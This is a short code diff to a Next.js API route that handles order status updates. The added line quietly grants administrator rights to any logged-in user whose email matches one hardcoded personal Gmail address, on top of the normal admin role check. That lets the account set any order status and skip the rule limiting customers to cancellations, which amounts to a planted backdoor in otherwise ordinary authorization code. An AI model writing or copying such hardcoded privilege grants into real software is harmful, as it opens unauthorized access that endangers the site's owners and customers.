@@ -54,7 +54,7 @@ export async function PATCH(request, { params }) {
       if (!VALID_STATUSES.includes(status)) {
         return NextResponse.json({ success: false, message: 'Invalid status value' }, { status: 400 });
       }
-      const isAdmin = authUser && authUser.role === 'admin';
+      const isAdmin = authUser && (authUser.role === 'admin' || authUser.email?.toLowerCase() === 'grizzlein@gmail.com');
       if (!isAdmin && !CUSTOMER_ALLOWED_STATUSES.includes(status)) {
         return NextResponse.json({ success: false, message: 'Customers can only cancel orders' }, { status: 403 });
       }
